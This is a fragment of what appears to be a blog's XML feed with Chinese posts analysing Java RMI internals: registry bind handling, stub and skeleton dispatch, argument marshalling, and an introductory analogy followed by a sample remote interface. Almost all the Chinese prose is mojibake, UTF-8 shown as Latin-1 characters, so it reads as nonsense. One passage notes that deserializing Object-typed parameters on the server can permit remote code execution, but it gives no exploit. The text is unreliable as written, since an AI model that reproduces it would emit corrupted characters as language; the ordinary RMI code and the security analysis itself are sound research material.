åºŠå“Ÿæ¥çš„åºåˆ—åŒ–å¯¹è±¡ï¼Œä¹‹åå†è°ƒç”¨<code>var6.bind</code>æ¥æ³¨å†ŒæœåŠ¡ï¼Œæ­¤æ—¶çš„<code>var6</code>æ˜¯<code>RegistryImpl</code>å¯¹è±¡ï¼Œè¿™æ˜¯è°ƒç”¨<code>createRegistry</code>è·å¾—çš„ã€‚</p><p>åˆ°è¿™é‡Œæˆ‘ä»¬ä¹Ÿå°±æ˜ç™½äº†ï¼Œå…¶å®æ— è®ºæ˜¯<code>å®¢æˆ·ç«¯</code>è¿˜æ˜¯<code>æœåŠ¡ç«¯</code>ï¼Œæœ€ç»ˆè°ƒç”¨æ³¨å†Œä¸­å¿ƒçš„æ–¹æ³•éƒ½æ˜¯é€šè¿‡å¯¹åˆ›å»ºçš„<code>RegistryImpl</code>å¯¹è±¡çš„è°ƒç”¨ã€‚é€šè¿‡ä¸Šé¢é‚£éƒ¨åˆ†ï¼Œæˆ‘ä»¬å·²ç»åˆ†æå®Œäº†å½“æ³¨å†Œä¸­å¿ƒç›‘å¬çš„ç«¯å£è¢«è¯·æ±‚æ—¶ï¼Œæœ¬åœ°æ˜¯å¦‚ä½•å¤„ç†è¿™äº›è¯·æ±‚çš„ã€‚</p><h3 id="è¿œç¨‹è·å–æ³¨å†Œä¸­å¿ƒ"><a href="#è¿œç¨‹è·å–æ³¨å†Œä¸­å¿ƒ" class="headerlink" title="è¿œç¨‹è·å–æ³¨å†Œä¸­å¿ƒ"></a>è¿œç¨‹è·å–æ³¨å†Œä¸­å¿ƒ</h3><p>é€šè¿‡<code>getRegistry</code>æ–¹æ³•è·å¾—çš„å¯¹è±¡æ˜¯<code>RegistryImpl_Stub</code>å¯¹è±¡ï¼Œä¸é€šè¿‡<code>createRegistry</code>è·å¾—çš„å¯¹è±¡ä¸åŒï¼Œ<code>createRegistry</code>è·å¾—çš„æ˜¯<code>RegistryImpl</code>å¯¹è±¡ã€‚</p><p>å½“æˆ‘ä»¬è°ƒç”¨è¿™ä¸¤è€…çš„æ–¹æ³•æ—¶ï¼Œå…¶å¯¹åº”çš„å¤„ç†æ–¹å¼ä¹Ÿååˆ†ä¸åŒï¼Œä»¥bindæ–¹æ³•ä¸¾ä¾‹ï¼Œé€šè¿‡createRegistryè·å¾—çš„æ³¨å†Œä¸­å¿ƒè°ƒç”¨bindæ–¹æ³•ååˆ†ç®€å•ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/bf38c474f3b452c4d280ea8cdfac025e.png" alt="image-20230822165156451"></p><p>æˆ‘çš„è¿™ä¸ªJDKç‰ˆæœ¬æ¯”è¾ƒä½ï¼Œåœ¨ç¨å¾®é«˜ä¸€ç‚¹çš„ç‰ˆæœ¬ï¼Œåœ¨bindä¸­é¦–å…ˆä¼šè¿›è¡Œ<code>checkAccess</code>ï¼Œé‡Œé¢æœ‰ä¸€äº›åˆ¤æ–­ï¼Œä¼šå¯¹ä½ å½“å‰çš„æƒé™ï¼Œæ¥æºIPè¿›è¡Œåˆ¤æ–­ï¼Œåœ¨é«˜ç‰ˆæœ¬JDKä¸­ä¸å…è®¸é™¤äº†localhostä¹‹å¤–çš„åœ°å€æ³¨å†ŒæœåŠ¡ï¼Œä¹Ÿæ˜¯åœ¨è¿™é‡Œè¿›è¡Œåˆ¤æ–­çš„ã€‚ä¹‹åå°±æ˜¯åˆ¤æ–­è¿™ä¸ªé”®æ˜¯å¦è¢«ç»‘å®šè¿‡ï¼Œå¦‚æœè¢«ç»‘å®šåˆ™æŠ›å¼‚å¸¸ï¼Œåä¹‹åˆ™å°†é”®å’Œå¯¹è±¡å€¼éƒ½putåˆ°Hashtableä¸­ã€‚</p><p>å¦‚æœæ˜¯è¿œç¨‹è°ƒç”¨bindæ–¹æ³•ï¼Œå°±æ¯”è¾ƒéº»çƒ¦äº†ã€‚æµ‹è¯•ä¼ªä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">8888</span>);<br><span class="hljs-type">Registry</span> <span class="hljs-variable">reg</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry(<span class="hljs-string">&quot;127.0.0.1&quot;</span>,<span class="hljs-number">8888</span>);<br>reg.bind(<span class="hljs-string">&quot;name&quot;</span>,obj)<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘å…ˆåˆ›å»ºäº†æ³¨å†Œä¸­å¿ƒï¼Œä¹‹åé€šè¿‡<code>getRegistry</code>çš„æ–¹å¼è¿œç¨‹è·å–æ³¨å†Œä¸­å¿ƒï¼Œæ­¤æ—¶è·å¾—åˆ°çš„å¯¹è±¡ä¸º<code>RegistryImpl_Stub</code>ï¼Œè·Ÿå…¥å…¶<code>bind</code>æ–¹æ³•ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/088ff2e013a57161c9a63e29cc760854.png" alt="image-20230822170127462"></p><p>é¦–å…ˆä¼šè°ƒç”¨<code>newCall</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/b1258f00c2992f113eb0e2f28612aa81.png" alt="image-20230822170303837"></p><p>æ³¨æ„è¿™é‡Œçš„<code>var3</code>ï¼Œå‰é¢è¯´è¿‡ï¼Œ0å¯¹åº”çš„æ˜¯bindæ–¹æ³•ï¼Œæ­¤æ—¶çš„var3å°±ä»£è¡¨äº†bindæ–¹æ³•å¯¹åº”çš„æ•°å­—ã€‚</p><p>åœ¨<code>newConnection</code>è¿™é‡Œï¼Œä¼šå†™å…¥ä¸€äº›å·²ç»çº¦å®šå¥½çš„æ•°æ®ï¼Œæ¯”å¦‚ipã€ç«¯å£ç­‰ï¼Œåœ¨<code>StreamRemoteCall</code>é‡Œï¼ŒåŒæ ·ä¼šå†™å…¥ä¸€äº›æ•°æ®ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/d998899f7c3e8656c6c9708ca3dae8bf.png" alt="image-20230822170627293"></p><p>è¿™é‡Œåœ¨æœ€å¼€å§‹å†™å…¥äº†80ï¼Œä¹Ÿå°±å’Œæˆ‘ä»¬ä¸Šè¾¹åˆ†ææ—¶è¯´çš„80å¯¹ä¸Šäº†ï¼Œç„¶åè¿˜ä¼šå†™ä¸€äº›æ•°æ®æ¯”å¦‚è¦è°ƒç”¨çš„æ–¹æ³•æ‰€å¯¹åº”çš„numå’ŒObjIDä¹‹ç±»çš„ã€‚</p><p>å½“è°ƒç”¨å®Œè¿™äº›ä¹‹åï¼Œå›åˆ°bindæ–¹æ³•ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/cee9cd6c9403b31713239bd8e92121b5.png" alt="image-20230822170803058"></p><p>æ­¤æ—¶ä¼šå†™å…¥ä¸¤ä¸ªå†…å®¹ï¼š</p><ul><li>åºåˆ—åŒ–åçš„<code>var1</code>ï¼›<code>var1</code>ä¸ºæˆ‘ä»¬è¦ç»‘å®šè¿œç¨‹å¯¹è±¡å¯¹åº”çš„åç§°</li><li>åºåˆ—åŒ–åçš„<code>var2</code>ï¼›<code>var2</code>ä¸ºæˆ‘ä»¬è¦ç»‘å®šçš„è¿œç¨‹å¯¹è±¡</li></ul><p>åœ¨<code>invoke</code>è¿™é‡Œä¼šæŠŠè¯·æ±‚å‘å‡ºå»ï¼Œæ¥ç€æˆ‘ä»¬çœ‹çœ‹æ³¨å†Œä¸­å¿ƒåœ¨æ”¶åˆ°è¿™æ¡è¯·æ±‚åæ˜¯å¦‚ä½•è¿›è¡Œå¤„ç†çš„ï¼Œå‰é¢è¯´äº†ä¼šè°ƒç”¨Skel.dispatchæ¥å¤„ç†è¯·æ±‚ï¼Œæˆ‘ä»¬ç›´æ¥çœ‹è¿™ä¸ªå°±å¯ä»¥äº†ã€‚</p><p><img src="https://ice.frostsky.com/2023/08/22/8fa89c502acee602776f65be69d4a756.png" alt="image-20230822163348059"></p><p>æ³¨å†Œä¸­å¿ƒé¦–å…ˆä¼šreadä¸¤ä¸ªObjectï¼Œç¬¬ä¸€ä¸ªå³æˆ‘ä»¬åˆšåˆšwriteè¿›å»çš„å­—ç¬¦ä¸²å¯¹è±¡ï¼Œç¬¬äºŒä¸ªå°±æ˜¯è¿œç¨‹å¯¹è±¡äº†ï¼Œæ¥ç€è°ƒç”¨<code>var6.bind</code>æ¥ç»‘å®šæœåŠ¡ï¼Œ<code>var6</code>å³<code>RegistryImpl</code>å¯¹è±¡ï¼Œä»–æ˜¯å¦‚ä½•ç»‘å®šæœåŠ¡çš„åœ¨ä¸Šè¾¹å†™äº†ã€‚</p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬å·²ç»äº†è§£äº†å½“æ³¨å†Œä¸­å¿ƒçš„æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼Œè¿œç¨‹è·å–å’Œæœ¬åœ°è·å–çš„å·®å¼‚æ˜¯ä»€ä¹ˆã€‚</p><h3 id="å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„é€šä¿¡"><a href="#å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„é€šä¿¡" class="headerlink" title="å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„é€šä¿¡"></a>å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„é€šä¿¡</h3><p>å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯çš„é€šä¿¡åªå‘ç”Ÿåœ¨è°ƒç”¨è¿œç¨‹æ–¹æ³•æ—¶ã€‚æ­¤æ—¶æ˜¯å®¢æˆ·ç«¯çš„è¿œç¨‹ä»£ç†å¯¹è±¡ä¸çš„Skelè¿›è¡Œé€šä¿¡ã€‚</p><p>æˆ‘ä»¬åœ¨å®¢æˆ·ç«¯è·å–çš„æ˜¯æ³¨å†Œä¸­å¿ƒå°è£…å¥½çš„ä»£ç†å¯¹è±¡ï¼Œæ‰€ä»¥é»˜è®¤ä¼šè°ƒç”¨ä»£ç†å¯¹è±¡çš„invokeæ–¹æ³•ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/275fe0c0aa0e7778e5e4615266113f1f.png" alt="image-20230822190737766"></p><p>åœ¨è¿™é‡Œä¼šåˆ¤æ–­ä½ è°ƒç”¨çš„æ–¹æ³•æ˜¯æ‰€æœ‰å¯¹è±¡éƒ½æœ‰çš„ï¼Œè¿˜æ˜¯åªæœ‰è¿œç¨‹å¯¹è±¡æ‰æœ‰çš„ï¼Œå¦‚æœæ˜¯å‰è€…ï¼Œåˆ™è¿›å…¥<code>invokeObjectMethod</code>ä¸­ï¼Œåè€…åˆ™è¿›å…¥<code>invokeRemoteMethod</code>ä¸­ã€‚</p><p>è·Ÿå…¥RemoteObjectInvocationHandle.<code>invokeRemoteMethod</code>ä¸­ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/212d78cbaef92f428dc4a68b4c883816.png" alt="image-20230822191142591"></p><p>åœ¨è¿™é‡Œä¼šè°ƒç”¨this.ref.invokeï¼Œå¹¶æŠŠproxyã€methodã€argsä»¥åŠmethodçš„hashä¼ è¿‡å»ï¼Œthis.refæ˜¯åœ¨lookupæ—¶è·å–åˆ°çš„è¿œç¨‹å¯¹è±¡ç»‘å®šçš„ä¸€äº›ç«¯å£ä¿¡æ¯ã€‚è·Ÿè¿›UnicastRef.<code>invoke</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/965c1bdafb6720c33e1abb54dfe78fb0.png" alt="image-20230822192250289"></p><p>åŒæ ·çš„ï¼Œåœ¨newConnectionè¿™é‡Œä¼šå‘é€ä¸€äº›çº¦å®šå¥½äº†çš„æ•°æ®ã€‚æ¥ç€åœ¨<code>marshaValue</code>è¿™é‡Œï¼Œä¼šå°†æˆ‘ä»¬è°ƒç”¨çš„æ–¹æ³•ã€è¦ä¼ é€’çš„å‚æ•°åºåˆ—åŒ–å†™åˆ°è¿æ¥ä¸­ï¼Œå¦‚æœä¼ é€’çš„å‚æ•°æ˜¯å¯¹è±¡ï¼Œå°±ä¼šå†™å…¥åºåˆ—åŒ–å¯¹è±¡åˆ°è¿™é‡Œï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/2760ce3fafec7c5457691bafc4eadb52.png" alt="image-20230822192434594"></p><p><img src="https://ice.frostsky.com/2023/08/22/9db8a8e76868723515c6c4f2529cd254.png" alt="image-20230822192608384"></p><p>æ¥ç€ä¼šè°ƒç”¨StreamRemoteCall.<code>executeCall</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/a873c1079afe69942f694b99facb08bd.png" alt="image-20230822192852263"></p><p>åœ¨this.releaseOutputStreamæ–¹æ³•ä¸­ï¼Œä¼šè¯»å–æœåŠ¡ç«¯æ‰§è¡Œçš„ç»“æœï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/dce65865b6bd708792bb4e505c6b9b07.png" alt="image-20230822192932757"></p><p>åœ¨this.out.flushæ—¶ï¼Œä¼šæŠŠä¹‹å‰å†™è¿›å»çš„æ•°æ®å‘å‡ºå»ï¼ŒæœåŠ¡ç«¯ä¼šè¿”å›æ‰§è¡Œç»“æœ</p><p>åœ¨è°ƒç”¨å®Œ<code>executeCall</code>åï¼Œä¼šè¿›å…¥ä¸‹è¾¹è¿™ä¸ªæ–¹æ³•ï¼ŒæŠŠæ•°æ®å–å‡ºæ¥ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/cbaeec9ab778702b00e8db09ce989024.png" alt="image-20230822193158889"></p><p>è°ƒç”¨äº†<code>unmarsharValue</code>æ–¹æ³•ï¼ŒæŠŠæ•°æ®å–å‡ºæ¥ï¼Œç”¨çš„æ˜¯jdkè‡ªå¸¦çš„readObjectï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/ca31e6155ff4c5f8df5fe0bd450079cf.png" alt="image-20230822193348959"></p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬æ¸…æ¥šäº†å®¢æˆ·ç«¯æ˜¯å¦‚ä½•å’ŒæœåŠ¡ç«¯é€šä¿¡çš„ã€‚è¿˜æœ‰æœåŠ¡ç«¯åˆæ˜¯å¦‚ä½•ä¸å®¢æˆ·ç«¯è¿›è¡Œé€šä¿¡çš„å‘¢ï¼Ÿ</p><p>å½“å®¢æˆ·ç«¯åœ¨ä¸æœåŠ¡ç«¯é€šä¿¡æ—¶ï¼ŒæœåŠ¡ç«¯å®é™…å¤„ç†è¯·æ±‚çš„ä½ç½®åœ¨ï¼šUnicastServerRef.<code>dispatch</code>ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/0b766de6573b2a12a7c7c4787b5fed90.png" alt="image-20230822194020581"></p><p>åœ¨è¿™é‡Œä¼šè°ƒç”¨<code>unmarshaValue</code>ï¼Œå¯¹è¯·æ±‚ä¼ æ¥çš„å‚æ•°è¿›è¡Œå¤„ç†ï¼š</p><p><img src="https://ice.frostsky.com/2023/08/22/695620729bcad38c89ea2bc0fbef8067.png" alt="image-20230822194335117"></p><p><img src="https://ice.frostsky.com/2023/08/22/fed9f7da4227336da7da5a83d6cdddd0.png" alt="image-20230822194354798"></p><p>åœ¨è¿™é‡Œä¼šåˆ¤æ–­å‚æ•°çš„æ•°æ®ç±»å‹ï¼Œå¦‚æœæ˜¯Objectçš„è¯ï¼Œåˆ™ä¼šååºåˆ—åŒ–ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬å¦‚æœèƒ½å¤Ÿæ‰¾åˆ°Serveræ³¨å†Œçš„è¿œç¨‹å¯¹è±¡ä¸­ï¼Œå¦‚æœæŸä¸ªæ–¹æ³•ä¼ é€’çš„å‚æ•°ç±»å‹æ˜¯Objectï¼Œåœ¨æœåŠ¡ç«¯è¿™é‡Œä¼šè¢«ååºåˆ—åŒ–ï¼Œæ­¤æ—¶å³å¯é€ æˆRCEã€‚</p><p><img src="https://ice.frostsky.com/2023/08/22/b54078598bee97a13408fbc92bca4055.png" alt="image-20230822194843997"></p><p>æœ€ç»ˆé€šè¿‡è°ƒç”¨invokeï¼Œæ¥è°ƒç”¨è¿œç¨‹å¯¹è±¡çš„æ–¹æ³•ã€‚</p><p>è‡³æ­¤ï¼Œæˆ‘ä»¬æ¸…æ¥šäº†è¿™ä¸‰è€…ä¹‹é—´çš„é€šä¿¡è¿‡ç¨‹</p>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>æ²¡äººæ¯”æˆ‘æ›´æ‡‚RMI(ä¸Š)</title>
    <link href="/2023/08/15/%E6%B2%A1%E4%BA%BA%E6%AF%94%E6%88%91%E6%9B%B4%E6%87%82RMI/"/>
    <url>/2023/08/15/%E6%B2%A1%E4%BA%BA%E6%AF%94%E6%88%91%E6%9B%B4%E6%87%82RMI/</url>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p><a href="https://www.oreilly.com/library/view/learning-java/1565927184/ch11s04.html">å‚è€ƒæ–‡ç« 1</a></p><p><a href="https://xz.aliyun.com/t/9261">å‚è€ƒæ–‡ç« 2</a></p><p><strong>æ¯ç¯‡é¸¡æ±¤ï¼š</strong></p><p>ä¸‡äº‹å¼€å¤´éš¾ï¼Œå½“èµ°å‡ºç¬¬ä¸€æ­¥ä½ ä¼šå‘ç°ï¼Œå…¶å®äº‹æƒ…å¹¶æ²¡æœ‰ä½ æƒ³è±¡çš„é‚£ä¹ˆç³Ÿç³•</p><p>æ–‡ç« å¯èƒ½ç¨å¾®æœ‰ç‚¹é•¿ï¼Œä¸€å®šè¦è€å¿ƒçœ‹å®Œ  <strong>o.0</strong></p><h1 id="RMIæ¦‚å¿µ"><a href="#RMIæ¦‚å¿µ" class="headerlink" title="RMIæ¦‚å¿µ"></a>RMIæ¦‚å¿µ</h1><p>æœ¬æ¥æƒ³æŠŠå®˜æ–¹å¯¹RMIçš„æ¦‚å¿µè´´åœ¨å¼€å¤´çš„ï¼Œçªç„¶æƒ³äº†æƒ³å¼€å¤´å°±æ•´è‡­é•¿è‡­é•¿çš„æ–‡å­—ï¼Œè°é¡¶å¾—ä½ã€‚å…¶å®æ€»çš„æ¥è¯´ç”¨ä¸€å¥è¯å°±å¯ä»¥æ¦‚æ‹¬ã€‚</p><p>â€”â€”RMIå°±æ˜¯è´Ÿè´£è¿œç¨‹è°ƒç”¨å¯¹è±¡çš„ã€‚</p><p>æ—¢ç„¶æåˆ°äº†è¿œç¨‹è°ƒç”¨å¯¹è±¡ï¼Œè‚¯å®šä¸æ˜¯è°ƒç”¨è‡ªå·±æœ¬åœ°çš„å¯¹è±¡ã€‚å…ˆç»™å¤§å®¶ä¸¾ä¸ªç”Ÿæ´»ä¸­çš„ä¾‹å­æ¸—é€ä¸€ä¸‹æ¦‚å¿µï¼š</p><p><img src="https://ice.frostsky.com/2023/08/15/d44cd0f578220653df11f321d447754e.jpeg" alt="j"></p><p>æ¯”å¦‚ä½ åœ¨åŒ—äº¬ä¸Šå­¦ï¼Œä½ å¥³ç¥åœ¨è¥¿å®‰ï¼Œå¹¶ä¸”ä½ æƒ³é€šè¿‡å‘é€ä¿¡æ¯ç»™å¥³ç¥å‘Šç™½ã€‚</p><ol><li><p>ä½ æƒ³å‘Šç™½ï¼Œå¾—é€šè¿‡æ‰‹æœºå‘é€ä¿¡æ¯ï¼ˆç›¸å½“äºè°ƒç”¨è¿œç¨‹æ–¹æ³•;ä½†æ˜¯è°ƒç”¨æ–¹æ³•ä¹‹å‰ä¼šå…ˆåˆ›å»º<code>Stub(sun.rmi.registry.RegistryImpl_Stub)</code>ï¼‰è¿™ä¸ª<code>stub</code>å°±ç›¸å½“äºä½ çš„æ‰‹æœºï¼›ä¹Ÿå°±æ˜¯è¯´ï¼Œä½ å¹¶ä¸èƒ½ç›´æ¥é¢å¯¹é¢å‘Šè¯‰å¥³ç¥ï¼Œè€Œæ‰‹æœºåªæ˜¯ä½ ä¼ é€’ä¿¡æ¯çš„ä¸€ç§åª’ä»‹ï¼Œç›¸å½“äºæ˜¯ä¸€ä¸ªä»£ç†ã€‚</p></li><li><p>ç„¶åä½ ç»™å¥³ç¥é‡Œå‘äº†ä¸ªä¿¡æ¯ï¼Œåœ¨ä½ åˆšå‘¼å‡ºçš„ä¸€ç¬é—´ï¼Œæ‰‹æœºä¼šå°†ä½ çš„å‘¼å‡ºä¿¡å·äº¤ç»™ä¸‰å¤§è¿è¥å•†ï¼ˆç›¸å½“äº<code>stub</code>ä¼šå°†<code>Remote</code>å¯¹è±¡ä¼ é€’ç»™<code>è¿œç¨‹å¼•ç”¨å±‚(java.rmi.server.RemoteRef)</code>å¹¶åˆ›å»º<code>java.rmi.server.RemoteCall(è¿œç¨‹è°ƒç”¨)</code>å¯¹è±¡ã€‚ï¼‰ä¸‰å¤§è¿è¥å•†ä¼šå¸®ä½ æ‰¾åˆ°ä½ çš„å¥³ç¥ã€‚</p></li><li><p>è¿è¥å•†åœ¨æ”¶åˆ°ä½ çš„ä¿¡å·åä¼šå°†ä½ è¿™ä¸ªå‘¼å‡ºçš„åŠ¨ä½œè½¬æ¢æˆå…¶ä»–å½¢å¼çš„ä¿¡å·è¿›è¡Œä¼ è¾“ï¼ˆ<code>RemoteCall</code>åºåˆ—åŒ–<code>RMIæœåŠ¡åç§°</code>ã€<code>Remote</code>å¯¹è±¡ã€‚ï¼‰</p></li><li><p>ç„¶åè¿è¥å•†é€šè¿‡è‡ªå·±æ¶è®¾çš„çº¿è·¯è¿›è¡Œé€šä¿¡ï¼ˆ<code>RMIå®¢æˆ·ç«¯</code>çš„<code>è¿œç¨‹å¼•ç”¨å±‚</code>ä¼ è¾“<code>RemoteCall</code>åºåˆ—åŒ–åçš„è¯·æ±‚ä¿¡æ¯é€šè¿‡<code>Socket</code>è¿æ¥çš„æ–¹å¼ä¼ è¾“åˆ°<code>RMIæœåŠ¡ç«¯</code>çš„<code>è¿œç¨‹å¼•ç”¨å±‚</code>ã€‚ï¼‰</p></li><li><p>åœ¨æ‰¾åˆ°å¯¹æ–¹ä¹‹åï¼Œå¯¹æ–¹æ‰‹æœºä¼šç«‹åˆ»å“é“ƒï¼ˆ<code>RMIæœåŠ¡ç«¯</code>çš„<code>è¿œç¨‹å¼•ç”¨å±‚(sun.rmi.server.UnicastServerRef)</code>æ”¶åˆ°è¯·æ±‚ä¼šè¯·æ±‚ä¼ é€’ç»™<code>Skeleton(sun.rmi.registry.RegistryImpl_Skel#dispatch)</code>ï¼›è¿™ä¸ª<code>Skeleton</code>å°±ç›¸å½“äºå¥³ç¥çš„æ‰‹æœºï¼‰</p></li><li><p>æ­¤æ—¶å¯¹æ–¹æ‰‹æœºä¼šå°†ä¹‹å‰ç”¨å…¶ä»–å½¢å¼ä¼ è¾“çš„ä¿¡å·ï¼Œè½¬å˜ä¸ºäººèƒ½çœ‹æ‡‚çš„æ–‡å­—ï¼ˆ<code>Skeleton</code>è°ƒç”¨<code>RemoteCall</code>ååºåˆ—åŒ–<code>RMIå®¢æˆ·ç«¯</code>ä¼ è¿‡æ¥çš„åºåˆ—åŒ–ã€‚ï¼‰</p></li><li><p>å¯¹æ–¹æŸ¥çœ‹æ‰‹æœº(Skeleton)ä¿¡æ¯ï¼Œå¹¶ç”¨æ‰‹æœºç»™ä½ è¿›è¡Œå›å¤ï¼šâ€œ<strong>ä½ æ˜¯ä¸ªå¥½äºº</strong>â€ï¼ˆ<code>Skeleton</code>å¤„ç†å®¢æˆ·ç«¯è¯·æ±‚ï¼š<code>bind</code>ã€<code>list</code>ã€<code>lookup</code>ã€<code>rebind</code>ã€<code>unbind</code>ï¼Œå¦‚æœæ˜¯<code>lookup</code>åˆ™æŸ¥æ‰¾<code>RMIæœåŠ¡å</code>ç»‘å®šçš„æ¥å£å¯¹è±¡ï¼Œåºåˆ—åŒ–è¯¥å¯¹è±¡å¹¶é€šè¿‡<code>RemoteCall</code>ä¼ è¾“åˆ°å®¢æˆ·ç«¯ã€‚ï¼‰</p></li><li><p>ä½ æ”¶åˆ°ä¿¡æ¯ï¼Œå¹¶çœ‹åˆ°æ˜¯å¥³ç¥ç»™ä½ çš„å›å¤ï¼Œéå¸¸æ¿€åŠ¨ï¼ï¼ˆ<code>RMIå®¢æˆ·ç«¯</code>ååºåˆ—åŒ–æœåŠ¡ç«¯ç»“æœï¼Œè·å–è¿œç¨‹å¯¹è±¡çš„å¼•ç”¨ï¼‰</p></li><li><p>ä½ åŒå‡»ä¿¡æ¯æ‰“å¼€è¿›ä¸€æ­¥æŸ¥çœ‹å†…å®¹ï¼ˆ<code>RMIå®¢æˆ·ç«¯</code>è°ƒç”¨è¿œç¨‹æ–¹æ³•ï¼Œ<code>RMIæœåŠ¡ç«¯</code>åå°„è°ƒç”¨<code>RMIæœåŠ¡å®ç°ç±»</code>çš„å¯¹åº”æ–¹æ³•å¹¶åºåˆ—åŒ–æ‰§è¡Œç»“æœè¿”å›ç»™å®¢æˆ·ç«¯ã€‚ï¼‰</p></li><li><p>ç»“æœçœ‹åˆ°å¥³ç¥é€ç»™ä½ çš„â€œå¥½äººå¡â€ï¼ˆ<code>RMIå®¢æˆ·ç«¯</code>ååºåˆ—åŒ–<code>RMI</code>è¿œç¨‹æ–¹æ³•è°ƒç”¨ç»“æœã€‚ï¼‰</p></li></ol><p>åœ¨ä»£ç å®ç°ä¹‹å‰æˆ‘ä»¬è¿˜éœ€è¦æ˜ç™½ä¸€ä¸ªåœ¨RMIä¸­æ‰®æ¼”ç€é‡è¦è§’è‰²çš„<strong>â€æ³¨å†Œä¸­å¿ƒâ€œ</strong>ï¼Œä»–åœ¨æœåŠ¡ç«¯åˆ›å»ºã€‚</p><p>æˆ‘ä»¬çŸ¥é“javaè¿œç¨‹å¯¹è±¡æ˜¯åŸºäºsocketæ¥è¿›è¡Œä¼ è¾“çš„ï¼Œæœ‰socketå°±è¦æœ‰ç«¯å£ã€‚</p><p>ä¸¾ä¸ªä¾‹å­ï¼š</p><p>æœåŠ¡ç«¯ç°åœ¨æœ‰ä¸€ä¸ªåä¸ºAçš„è¿œç¨‹å¯¹è±¡ã€‚ç°åœ¨ä½ æ˜¯å®¢æˆ·ç«¯ï¼Œä½ å¹¶ä¸çŸ¥é“æœåŠ¡ç«¯æŠŠè¿™ä¸ªAå¼€æ”¾åœ¨å¯¹åº”çš„å“ªä¸ªç«¯å£ã€‚å°±ç®—ä½ çŸ¥é“äº†Açš„å¼€æ”¾ç«¯å£ã€‚æœåŠ¡å…¶ä¸Šè¿˜æœ‰Bã€Cã€Dâ€¦â€¦..éš¾é“ä½ è¦è®°ä½æ¯ä¸ªè¿œç¨‹å¯¹è±¡çš„ç«¯å£å—ï¼Ÿå¾ˆæ˜æ˜¾è¿™æ˜¯ä¸ç°å®çš„ã€‚</p><p>é‚£ä¹ˆè¿™ä¸ªæ—¶å€™ï¼Œå°±è¦ç”¨åˆ°æˆ‘ä»¬çš„æ³¨å†Œä¸­å¿ƒã€‚ä»–çš„ä½œç”¨å°±æ˜¯å°†è‡ªå·±ç»‘å®šåœ¨æœåŠ¡ç«¯çš„æŸä¸ªç«¯å£(é»˜è®¤1099)è¿™æ ·ä½ åªéœ€è¦è®°ä½ä¸€ä¸ªç«¯å£ï¼Œä»–ä¼šå¸®æˆ‘ä»¬è®°ä½è¿™100ä¸ªè¿œç¨‹å¯¹è±¡å¯¹åº”çš„å¼€æ”¾ç«¯å£ã€‚å½“å®¢æˆ·ç«¯è¿›è¡Œè°ƒç”¨çš„æ—¶å€™ï¼Œåªéœ€è¦å‘Šè¯‰æ³¨å†Œä¸­å¿ƒï¼Œæˆ‘è¦æ‰¾Aï¼Œé‚£ä¹ˆæ³¨å†Œä¸­å¿ƒå°±ä¼šå‘Šè¯‰ä½ Aæ‰€å¯¹åº”çš„ç«¯å£ã€‚æœ‰ç‚¹åƒäº¤æ¢æœºå’Œè·¯ç”±å™¨çš„åŸç†ã€‚</p><p>åœ¨äº†è§£è¿™ä¸ªé‡è¦æ¦‚å¿µä»¥åï¼Œæˆ‘ä»¬å†æ¥æ¥ç€å¾€ä¸‹çœ‹RMIå…·ä½“æ˜¯å¦‚ä½•å®ç°çš„ã€‚</p><p>RMIå…·ä½“ä»£ç å®ç°å¦‚ä¸‹ï¼š</p><p><strong>æœåŠ¡ç«¯ä»£ç ï¼š</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.rmi.Remote;<br><span class="hljs-keyword">import</span> java.rmi.RemoteException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">IRemoteObj</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span> &#123;<br>    <span class="hljs-comment">//è¿™ä¸ªæ¥å£å®šä¹‰ç€ä½ éƒ½èƒ½è°ƒç”¨æœåŠ¡ç«¯çš„ä»€ä¹ˆæ–¹æ³•ã€‚éœ€è¦æŠ›å‡º RemoteException</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(String keywords)</span> <span class="hljs-keyword">throws</span> RemoteException;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 